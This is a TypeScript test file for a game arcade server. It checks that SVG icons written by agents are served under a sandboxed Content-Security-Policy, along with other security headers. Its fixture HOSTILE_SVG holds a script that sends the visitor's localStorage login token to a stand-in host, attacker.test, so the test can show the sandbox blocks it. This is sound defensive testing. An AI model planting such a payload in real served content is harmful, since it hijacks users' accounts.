/**
 * The headers that stop agent-authored bytes running as code on the
 * arcade's origin.
 *
 * The vulnerability these exist for was real and was confirmed in a browser:
 * a game's `arcade/icon.svg` is written by an AGENT, captured off its dev
 * server, and served back from `/api/games/:id/art/:kind` as
 * `image/svg+xml`. An SVG served that way is a document, not a picture —
 * navigate to one and it runs its own `<script>`, on the arcade's origin,
 * where the visitor's `ark_` login token sits in localStorage. A hostile
 * icon took over the account of anyone who opened it.
 *
 * `sandbox` in the CSP is what makes that impossible, so it is asserted
 * here rather than left to a code comment.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import Fastify, { type FastifyInstance } from 'fastify';
import { ArcadeDb, type GameRow } from '../server/db.ts';
import { EventHub } from '../server/events.ts';
import type { GameEngine } from '../server/engine.ts';
import { registerRoutes } from '../server/routes.ts';
import { ART_CSP, registerSecurityHeaders } from '../server/security.ts';
import { seedArcade } from './seed.ts';

let app: FastifyInstance;
let db: ArcadeDb;
let game: GameRow;

const engineStub = {
  ensureWatcher: async () => {},
  dropWatcher: () => {},
  poke: () => {},
} as unknown as GameEngine;

/** What a compromised game agent would write into its `public/` dir. */
const HOSTILE_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">' +
  '<script>fetch("https://attacker.test/?t="+localStorage.getItem("reflex-arcade:token"))</script>' +
  '</svg>';

beforeAll(async () => {
  db = await ArcadeDb.open({ kind: 'pglite', dataDir: 'memory://' });
  const seeded = await seedArcade(db);
  await db.setGameArt(seeded.gameId, {
    iconArt: `data:image/svg+xml;base64,${Buffer.from(HOSTILE_SVG).toString('base64')}`,
  });
  game = (await db.gameById(seeded.gameId))!;

  app = Fastify();
  registerRoutes(app, {
    db,
    hub: new EventHub(),
    engine: engineStub,
    reflexAgentType: 'claude-code',
  });
  registerSecurityHeaders(app);
  await app.ready();
});

afterAll(async () => {
  await app.close();
  await db.close();
});

describe('agent-authored art', () => {
  it('is served sandboxed, so a hostile SVG cannot run its script', async () => {
    const reply = await app.inject({
      method: 'GET',
      url: `/api/games/${game.id}/art/icon?v=${game.artVersion}`,
    });
    expect(reply.statusCode).toBe(200);
    expect(reply.headers['content-type']).toBe('image/svg+xml');
    // `sandbox` without `allow-scripts` is the control; the rest keeps the
    // document from reaching out for anything either.
    expect(reply.headers['content-security-policy']).toBe(ART_CSP);
    expect(String(reply.headers['content-security-policy'])).toContain('sandbox');
    expect(String(reply.headers['content-security-policy'])).not.toContain('allow-scripts');
  });

  it('hands the bytes back as authored — the sandbox is the fix, not filtering', async () => {
    // Deliberate: stripping tags out of a hostile SVG is a regex arms race,
    // and mangling art would break the animation the agents legitimately
    // use. The browser is stopped from executing it instead.
    const reply = await app.inject({
      method: 'GET',
      url: `/api/games/${game.id}/art/icon?v=${game.artVersion}`,
    });
    expect(reply.body).toContain('<script>');
  });
});

describe('every response', () => {
  it('refuses content-type sniffing and keeps game URLs out of referrers', async () => {
    // A game id IS the capability to view an unlisted game; a full referrer
    // would hand it to every host a game links out to.
    const reply = await app.inject({ method: 'GET', url: '/api/health' });
    expect(reply.headers['x-content-type-options']).toBe('nosniff');
    expect(reply.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
  });

  it('asks for HTTPS only when it was reached over HTTPS', async () => {
    const plain = await app.inject({ method: 'GET', url: '/api/health' });
    expect(plain.headers['strict-transport-security']).toBeUndefined();

    const secure = await app.inject({
      method: 'GET',
      url: '/api/health',
      headers: { 'x-forwarded-proto': 'https' },
    });
    expect(secure.headers['strict-transport-security']).toContain('max-age=');

    // A proxy chain gives a list; the first hop is the client's.
    const chained = await app.inject({
      method: 'GET',
      url: '/api/health',
      headers: { 'x-forwarded-proto': 'https, http' },
    });
    expect(chained.headers['strict-transport-security']).toContain('max-age=');
  });
});
